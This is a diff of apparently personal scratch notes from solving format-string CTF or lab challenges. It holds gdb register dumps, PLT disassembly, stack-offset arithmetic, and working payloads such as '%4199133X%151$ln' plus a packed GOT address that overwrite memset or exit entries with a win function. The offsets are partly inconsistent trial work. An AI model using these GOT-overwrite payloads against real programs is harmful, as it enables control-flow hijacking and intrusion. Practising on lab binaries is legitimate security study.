@@ -1,5 +1,6 @@
 
-40131d <win>:  = 4199197 + 8 = 4199205
+========== 1 ============
+40131d <win>:  = 4199197 
 
  # 404050 <memset@GLIBC_2.2.5>
 
@@ -22,4 +23,219 @@
 0x00000000004014cd <+358>:   call   0x401160 <printf@plt>
 │gef➤  info r
 
+Consider this - 
+if your padding is 0x20 (32), that is 4 memory blocks
+1 pointer and 2 ints would add another 8 + 4 + 4 = 2 memory blocks
+payload string would occupy 16 bytes = 2 memory blocks
+and printf will start to look from 6th position in stack
 
+4 + 2 + 2 + 6 = 14
+
+============================== 2 =========================================
+0x1d0 = 464 / 8 = 58
+[*] '/challenge/babyformat_level2'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+hacker@format-string-level
+
+0000000000001190 <memset@plt>:
+    1190:       f3 0f 1e fa             endbr64 
+    1194:       f2 ff 25 05 2e 00 00    bnd jmpq *0x2e05(%rip)        # 3fa0 <memset@GLIBC_2.2.5>
+    119b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
+
+0x3fa0 = 16288
+
+0000000000001330 <win>:
+0x1330 = 4912
+
+gef➤  p/x $rbp+8
+│$5 = 0x7ffebb150188
+│gef➤  p/x $rsp
+│$6 = 0x7ffebb14fb80
+
+>>> 0x7ffebb150188
+140732037136776
+>>> 0x7ffebb14fb80
+140732037135232
+>>> (140732037136776-140732037135232)/8 = 1544/8 (rip - rsp) / 8
+193.0 + 6 registers = 199
+
+1730:       e8 45 fc ff ff          callq  137a <func>
+1735:       b8 00 00 00 00          mov    $0x0,%eax
+
+│gef➤  info r
+│rax            0x0                 0x0
+│rbx            0x2020202020202020  0x2020202020202020
+│rcx            0x7fcc3126d077      0x7fcc3126d077
+│rdx            0x0                 0x0
+│rsi            0x7fcc3134c723      0x7fcc3134c723
+│rdi            0x7ffcbbfe84d0      0x7ffcbbfe84d0
+│rbp            0x7ffcbbfe88f0      0x7ffcbbfe88f0
+│rsp            0x7ffcbbfe82f0      0x7ffcbbfe82f0
+│r8             0x18                0x18
+│r9             0x2d                0x2d
+│r10            0x56449162a4bb      0x56449162a4bb
+│r11            0x246               0x246
+│r12            0x564491629200      0x564491629200
+│r13            0x7ffcbbfe8a30      0x7ffcbbfe8a30
+│r14            0x0                 0x0
+│r15            0x0                 0x0
+│rip            0x5644916295b2      0x5644916295b2 <func+568>
+│eflags         0x202               [ IF ]
+│cs             0x33                0x33
+│ss             0x2b                0x2b
+│ds             0x0                 0x0
+│es             0x0                 0x0
+│fs             0x0                 0x0
+│gs             0x0                 0x0
+
+gef➤  x/i $pc
+=> 0x563deb97b5b2 <func+568>:   call   0x563deb97b170 <printf@plt>
+gef➤  
+│gs     
+
+1730:       e8 45 fc ff ff          callq  137a <func>
+1735:       b8 00 00 00 00          mov    $0x0,%eax
+
+gef➤  x/i $pc
+=> 0x5636b534d5b2 <func+568>:	call   0x5636b534d170 <printf@plt>
+gef➤  x/s $rdi
+0x7ffe4b97d7d0:	"Your input is:", ' ' <repeats 107 times>, "\n", 'A' <repeats 14 times>, "\n"
+gef➤  
+
+gef➤  p/x $rsp
+$1 = 0x7ffe4b97d5f0
+
+0xd7d0 + 14 + 107 + 1 - 0xd5f0 = 602 / 8 = 75 || 602%8 = 2
+75 + 6 = 81 , 2 padding
+win addr value - 122 = 
+
+
+gef➤  p/x $rbp
+$1 = 0x7ffde110b2e0   // main rbp
+
+gef➤  p/x $rbp
+$1 = 0x7ffc96359fd0 // func rbp
+0x7ffde110b2e0 - 0x7ffc96359fd0 = 5550838544
+
+--------
+0x7ffe8120c6c0 (rsp) - 0x7ffe8120ccc0 (rbp) = -1536/8 = 192 = offset
+%193$p // rip func , place where return in main // need to change it somehow
+0x7ffd42121420 = rbp main
+0x7ffd421213d0 = rbp func
+rbp main - rbp func = 80
+
+gef➤  x/s $rdi
+0x7ffd42120fb0:	"Your input is:", ' ' <repeats 107 times>, "\nAAAAAA\n" = 122/8 = 15, 2 padding
+0x7ffd42120fb0 (rdi) - 0x7ffd42120dd0(rsp) = 480/8 = 60
+60 + 122/8 (input) + 6 = 60 + 15 + 6 = 81, 2 remiander
+
+============ ch 4=========
+0000000000401150 <memset@plt>:
+  401150:       f3 0f 1e fa             endbr64 
+  401154:       f2 ff 25 ed 2e 00 00    bnd jmpq *0x2eed(%rip)        # 404048 <memset@GLIBC_2.2.5>
+  40115b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
+
+00000000004012dd <win>:  = 4199133
+func - 0x00000000004014b8 <+401>:	call   0x401130 <printf@plt>
+
+gef➤  x/s $rdi
+0x7ffe2af6cc70:	"Your input is:", ' ' <repeats 68 times>, "\n", 'A' <repeats 11 times>, "\n"
+
+
+│gef➤  x/s $rdi
+│0x7ffc8fb72b00: "Your input is:", ' ' <repeats 68 times>, "\n%4199133X%149$lnH@@"
+│gef➤  info r
+│rax            0x0                 0x0
+│rbx            0x2020202020202020  0x2020202020202020
+│rcx            0x7f93cdfe3077      0x7f93cdfe3077
+│rdx            0x0                 0x0
+│rsi            0x7f93ce0c2723      0x7f93ce0c2723
+│rdi            0x7ffc8fb72b00      0x7ffc8fb72b00
+│rbp            0x7ffc8fb72f20      0x7ffc8fb72f20
+│rsp            0x7ffc8fb72920      0x7ffc8fb72920
+│r8             0x14                0x14
+│r9             0x2d                0x2d
+│r10            0x4005cf            0x4005cf
+│r11            0x246               0x246
+│r12            0x4011b0            0x4011b0
+│r13            0x7ffc8fb73060      0x7ffc8fb73060
+│r14            0x0                 0x0
+│r15            0x0                 0x0
+│rip            0x4014b8            0x4014b8 <func+401>
+│eflags         0x206               [ PF IF ]
+│cs             0x33                0x33
+│ss             0x2b                0x2b
+│ds             0x0                 0x0
+│es             0x0                 0x0
+│fs             0x0                 0x0
+│gs             0x0                 0x0
+│gef➤  x/20gx $rsp
+│0x7ffc8fb72920: 0x00000053ce0c7000      0x00007ffc8fb72b53
+│0x7ffc8fb72930: 0x0000000000400478      0x00007f93ce0c7570
+│0x7ffc8fb72940: 0x00007f93cded7960      0x00007f93ce0dd88a
+│0x7ffc8fb72950: 0x000000000000037f      0x00007f93cdee6ea0
+│0x7ffc8fb72960: 0x00007f93ce0c7000      0x00007ffc8fb72a08
+│0x7ffc8fb72970: 0x00007ffc8fb72a04      0x0000000000000000
+│0x7ffc8fb72980: 0x00007f93cdee6ea0      0x0000000000000000
+│0x7ffc8fb72990: 0x0000000000000000      0x00007f93cded9070
+│0x7ffc8fb729a0: 0x00000000004005c8      0x000000000d82b830
+│0x7ffc8fb729b0: 0x0000000000360ae0      0x00007ffc8fb72a04
+│gef➤  x/s 0x7ffc8fb72920
+│0x7ffc8fb72920: ""
+│gef➤  x/s 0x00000053ce0c7000
+│0x53ce0c7000:   <error: Cannot access memory at address 0x53ce0c7000>
+│gef➤  x/s 0x0000000000360ae0
+
+00000000004011a0 <exit@plt>:
+  4011a0:       f3 0f 1e fa             endbr64 
+  4011a4:       f2 ff 25 c5 2e 00 00    bnd jmpq *0x2ec5(%rip)        # 404070 <exit@GLIBC_2.2.5>
+  4011ab:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
+
+563%8=3, 563/8 = 70
+4199133 - 14-68-1=4199050
+
+rdi + 14 + 68 + 1 - rsp
+padding = 0x7ffc8fb72b00 (rdi) - 0x7ffc8fb72920 (rsi) + 14 + 68 + 1 [leading input] = 563
+4199133 (win addr in decimal) - 563 (padding) = 4198570
+68$ (positional argument location calculation) = 58 (struct  layout padding ) + 2 (pointer and int) + 2 (payload string) + 6 (stack location)
+buf = b"%04198570d%68$ln" + p64(0x404070) // term1 + p64(exit location), writing win into exit func
+
+ exploit = b"%4199133X%151$ln" + p64(0x404048)  // 4199133 = win address ,  0x404048 = memset memory location, 151$ = 58 (struct  layout padding ) + 14+68+1 (for leading input) + 2 (pointer and int) + 2 (payload string) + 6 (stack location)
+
+ gef➤  x/s $rdi
+ │0x7ffed767e510: "Your input is:", ' ' <repeats 68 times>, "\n%04198570d%68$lnp@@"
+ │gef➤  p/x $rsp
+ │$1 = 0x7ffed767e330
+
+ │0x7ffed767e510 - 0x7ffed767e330 + 14 + 68 + 1 = 563
+
+
+ 563, 83  
+
+
+ win = 4199133
+
+1)4199133 - 563 = 4198570
+2)4199133 - 83 = 4199050
+
+58 + 6 + 4 = 68
+
+563/8 = 71, 70
+83/8 = 11, 10
+
+68, 138, 139, 78, 79
+
+buf = b"%04198570d%68$ln" + p64(0x404070)
+
+buf = b"%04199050d%76$ln" + p64(0x404070)
+
+
+0x7ffed767e510 - 0x7ffed767e330 = 480/8 = 60
+60 + 14 + 68 + 1 = 143 + 6 = 149
+563/8 = 70 + 6 = 76
+
+===============================
